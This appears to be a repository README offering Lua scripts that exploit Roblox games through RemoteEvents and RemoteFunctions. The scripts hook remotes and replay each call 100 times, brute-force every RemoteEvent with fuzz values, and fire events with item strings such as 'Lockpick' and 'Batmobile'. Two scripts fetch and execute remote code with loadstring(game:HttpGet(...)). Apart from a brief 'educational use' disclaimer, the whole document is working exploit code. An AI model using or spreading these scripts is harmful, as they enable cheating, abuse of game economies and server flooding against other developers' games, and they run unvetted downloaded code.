# Roblox Remote Vulnerability Testing Scripts

A collection of scripts for testing vulnerabilities in **RemoteEvents** and **RemoteFunctions** in Roblox games. These scripts assist in **brute-forcing remote calls**, **spying on RemoteFunctions**, and **manipulating remote arguments**.

## Scripts Overview

### 1️⃣ Remote Hooking  
Hooks into remote functions and executes custom logic on intercepted calls.  

<details>
  <summary>Click to expand</summary>

```lua
local HS = loadstring(game:HttpGet('https://raw.githubusercontent.com/0zBug/HookingService/refs/heads/main/main.lua'))()
  local function HookFunction(originalFunction, remote, ...)
      local args = {...}
      print("arguments:", unpack(args))
      --
      for i = 1, 100 do
          originalFunction(remote, unpack(args))
      end
  
      return originalFunction(remote, unpack(args))
  end
  local remote = workspace
  HS:HookRemote(remote, HookFunction)
```
</details>

---

### 2️⃣ RemoteFunction Spy  
Recursively prints tables and RemoteFunction outputs in the developer console.  

<details>
  <summary>Click to expand</summary>

```lua
  local repr = loadstring(game:HttpGet('https://raw.githubusercontent.com/Ozzypig/repr/master/repr.lua'))()
game.StarterGui:SetCore("DevConsoleVisible", true)
```
</details>

---

### 3️⃣ Bruteforce RemoteEvents  
Attempts to brute-force **RemoteEvent** calls using a variety of parameter values.  

<details>
  <summary>Click to expand</summary>

```lua
local params = {
    nil, true, false, 0, 1, -1, 100, -100, math.huge, 0/0, "100bucks2", "imadethis12321", workspace, 
    game.Players.LocalPlayer, game.Players.LocalPlayer.Character,
}
for i,v in pairs(game.ReplicatedStorage.Packages:GetDescendants()) do 
    if v:IsA("RemoteEvent") then 
        for i,b in pairs(params) do
            for i,c in pairs(params) do
                pcall(function()
                    v:FireServer(b, c)
                end)
            end
        end
    end
end
```
</details>

---

### 4️⃣ Miscellaneous Remote Call  
Executes a predefined **RemoteEvent** with a specific argument (`"Batmobile"`).  

<details>
  <summary>Click to expand</summary>

```lua
for i,v in pairs(game.ReplicatedStorage.Packages:GetDescendants()) do
    if v:IsA("RemoteEvent") then 
        v:FireServer("Batmobile") -- Edit this as needed
    end
end
```
</details>

---

### 5️⃣ Targeted Remote Bruteforcing  
Attempts to call RemoteEvents with specific **game-related parameters** (e.g., `"Lockpick"`, `"Police"`).  

<details>
  <summary>Click to expand</summary>

 ```lua
for i,v in pairs(game.ReplicatedStorage:GetDescendants()) do 
    if v:IsA("RemoteEvent") and v.Name ~= "giveMop" and v.Name ~= "ResetPlayerData" and v.Name ~= "Respawn" and not v:IsDescendantOf(game.ReplicatedStorage.spawner) then 
        v:FireServer("Lockpick")
    end
end
```
</details>

---

## ⚠️ Disclaimer  
These scripts are for **educational and security testing purposes only**. **Misuse may violate the terms of service of Roblox** and could result in bans or legal consequences. Use responsibly.  
